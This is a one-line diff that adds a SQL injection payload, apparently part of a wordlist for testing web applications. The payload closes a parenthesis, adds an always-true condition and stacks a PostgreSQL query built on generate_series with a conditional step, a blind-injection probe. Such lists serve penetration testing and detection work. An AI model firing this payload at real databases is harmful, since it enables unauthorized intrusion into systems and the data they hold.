@@ -1,0 +1,1 @@
+1) as nsdy where 7513=7513;select * from generate_series(3267,3267,case when (3267=5900) then 1 else 0 end) limit 1--
